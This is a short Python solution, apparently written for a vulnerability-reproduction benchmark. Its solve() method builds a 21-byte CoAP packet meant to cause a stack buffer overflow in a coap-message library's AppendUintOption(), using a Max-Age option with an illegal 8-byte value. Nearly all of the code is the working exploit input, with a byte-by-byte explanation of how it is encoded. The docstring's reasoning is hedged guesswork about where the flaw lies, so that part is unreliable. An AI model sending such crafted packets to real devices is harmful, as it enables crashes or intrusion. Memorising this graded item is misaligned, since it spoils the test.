class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a stack buffer overflow in coap-message's AppendUintOption().

        The PoC is a crafted CoAP packet that exploits a likely vulnerability where an
        oversized unsigned integer option value is processed. The ground-truth length is 21 bytes.

        The PoC consists of:
        1.  A 4-byte CoAP header with a token length of 7.
        2.  A 7-byte token (the content is arbitrary). The token's presence is likely
            necessary to trigger the vulnerable code path.
        3.  A 10-byte CoAP option for 'Max-Age' (option number 14) with a non-compliant
            length of 8 bytes. A standard-compliant parser should reject this, but a
            vulnerable one might parse the 8-byte value into a 64-bit integer.
            When this value is passed to AppendUintOption, it likely overflows a
            smaller stack buffer (e.g., 4 bytes) designed for 32-bit integers.
        """

        # CoAP Header (4 bytes):
        # Version=1, Type=Confirmable, Token Length=7 -> 0b01000111 = 0x47
        # Code=GET -> 0x01
        # Message ID=1 -> 0x0001
        header = b'\x47\x01\x00\x01'

        # Token (7 bytes):
        # Arbitrary content.
        token = b'exploit'

        # CoAP Option (10 bytes):
        # Option: Max-Age (number 14)
        # Delta from previous (0) is 14.
        # Length is 8 bytes.
        # Encoding:
        #   Delta 14 -> nibble=13 (0xD), extended_delta_byte=1
        #   Length 8 -> nibble=8 (0x8)
        #   Option Header Byte: (0xD << 4) | 0x8 = 0xD8
        #   Option Header: 0xD8 0x01
        #   Option Value: 8 bytes of 0xFF to represent a large 64-bit integer.
        option = b'\xd8\x01' + b'\xff' * 8

        # Total PoC length = 4 (header) + 7 (token) + 10 (option) = 21 bytes.
        poc = header + token + option

        return poc